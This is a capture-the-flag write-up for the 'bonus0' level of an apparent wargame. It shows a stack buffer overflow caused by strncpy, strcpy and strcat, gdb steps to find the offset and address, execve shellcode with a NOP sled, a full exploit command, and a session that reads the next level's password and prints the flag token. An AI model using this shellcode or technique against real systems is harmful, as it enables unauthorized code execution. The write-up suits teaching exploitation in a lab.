# bonus0

## 1. Decompilation with Ghidra

The binary contains three functions with dangerous string handling:

```c
/* Function p() - reads input with prompt */
void p(char *param_dest, const char *prompt)
{
    char *nl;
    char big_read_buffer[4104];

    puts(prompt);
    read(0, big_read_buffer, 0x1000);     /* reads up to 4096 bytes */
    nl = strchr(big_read_buffer, '\n');
    if (nl != NULL) *nl = '\0';
    strncpy(param_dest, big_read_buffer, 0x14); /* copies 20 bytes, may not null-terminate! */
    return;
}

/* Function pp() - builds and concatenates strings */
void pp(char *param_out)
{
    char local_34[20];   /* first_part */
    char local_20[20];   /* second_part */

    p(local_34, " - ");
    p(local_20, " - ");

    strcpy(param_out, local_34);  /* ⚠️ No null-terminator check! */
    
    size_t len = strlen(param_out);
    param_out[len] = ' ';
    param_out[len+1] = '\0';
    
    strcat(param_out, local_20); /* ⚠️ No size check! */
    return;
}

int main(void)
{
    char local_3a[54];  /* output_buffer */
    pp(local_3a);
    puts(local_3a);
    return 0;
}
```

## 2. Analysis of the vulnerability

The vulnerabilities:

1. **Function `p()`: `strncpy` doesn't null-terminate** if source is >= 20 bytes
   - `strncpy(param_dest, big_read_buffer, 0x14)` copies exactly 20 bytes
   - If input is 20+ chars, no `\0` is added to `param_dest`

2. **Function `pp()`: `strcpy` reads beyond buffer** if source not null-terminated
   - `strcpy(param_out, local_34)` copies until finding `\0`
   - If `local_34` has no `\0`, continues reading into `local_20`!

3. **Function `pp()`: `strcat` has no bounds checking**
   - Can overflow `param_out` (54 bytes max in main)

Stack layout in `pp()`:

```text
High addresses
─────────────────────────────
[return address to main]  ← TARGET 🎯
[saved EBP]
[local_34: 20 bytes]     ← first input (first_part)
[local_20: 20 bytes]     ← second input (second_part)
─────────────────────────────
Low addresses
```

## 3. Finding the exploit strategy

Strategy:

1. **First input**: Send exactly 20 characters (no newline counted)
   - `p()` copies 20 bytes with `strncpy` → **no null terminator**
   - `local_34` = `[20 chars, no \0]`

2. **Second input**: Send payload to overflow
   - `local_20` = our controlled data

3. **In `pp()`**:
   - `strcpy(param_out, local_34)` copies 20 bytes + continues reading
   - Reads into `local_20` until finding `\0`
   - `strlen(param_out)` returns wrong length
   - `strcat(param_out, local_20)` appends more data
   - **Overflow occurs and overwrites saved EIP!**

### Finding the offset to EIP

```bash
gdb ./bonus0
(gdb) run
# Input 1: AAAAAAAAAAAAAAAAAAAA (20 A's)
# Input 2: BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL

# Program received signal SIGSEGV, Segmentation fault.
# 0x43434343 in ?? ()
```

**EIP = 0x43434343 = "CCCC"** → offset = **9 bytes** from start of second input

### Finding the buffer address in p()

The function `p()` has a large buffer[4096] where we can store our shellcode:

```bash
gdb ./bonus0
(gdb) set disassembly-flavor intel
(gdb) disass p
# Find: lea eax,[ebp-0x1008]  at offset +28 (0x080484d0)

(gdb) b *0x080484d0
(gdb) run
# Input 1: (any input)

(gdb) x $ebp-0x1008
# Result: 0xbfffe590  ← buffer address
```

### Calculate shellcode address

```
Buffer address:      0xbfffe590
+ 61 bytes:          0xbfffe5cd  (skip copied arguments)
+ 40 bytes:          0xbfffe5f5  ← Target address (middle of NOPs)
```

## 4. Exploitation

Memory layout of the exploit:

```text
p() function buffer[4096]:
┌─────────────────────────────────────────────────────────┐
│ [100 NOPs] + [shellcode (28 bytes)] + [unused space]   │
│  └─ 0xbfffe590                    └─ 0xbfffe5f8         │
└─────────────────────────────────────────────────────────┘
                      ↑
                      Target: 0xbfffe5f5 (middle of NOPs)

pp() function stack:
┌─────────────────────────────────┐
│ local_20[20]  ← Input 2         │
│ local_34[20]  ← Input 1         │
│ saved EBP                       │
│ saved EIP     ← Overwritten! 🎯 │
└─────────────────────────────────┘
```

Payload structure:

**Input 1:** 100 NOPs + shellcode

```python
"\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

**Input 2:** Offset (9 bytes) + Target address (4 bytes) + Padding (7 bytes)

```python
"A" * 9 + "\xf5\xe5\xff\xbf" + "B" * 7
```

Full exploitation command:

```bash
(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xf5\xe5\xff\xbf" + "B" * 7'; cat) | ./bonus0
```

Execution flow:

1. First `p()` call: Reads input1, fills buffer[4096] with NOPs + shellcode
2. `strncpy(local_34, buffer, 20)` copies 20 NOPs **without null terminator**
3. Second `p()` call: Fills buffer[4096] with input2
4. `strncpy(local_20, buffer, 20)` copies: `"AAAAAAAAA\xf5\xe5\xff\xbf..."`
5. `strcpy(param_out, local_34)` copies 20 bytes + continues into `local_20`
6. `strcat(param_out, local_20)` causes overflow, overwrites saved EIP with `0xbfffe5f5`
7. `pp()` returns, jumps to `0xbfffe5f5` (middle of NOPs)
8. CPU slides through NOPs to shellcode
9. Shellcode executes: `execve("/bin/sh")` 🎉

Full exploitation session:

```bash
bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xf5\xe5\xff\xbf" + "B" * 7'; cat) | ./bonus0
 - 
 - 
AAAAAAAAA����BBBBBBB��� AAAAAAAAA����BBBBBBB���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## 5. Token discovered

The token is: `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
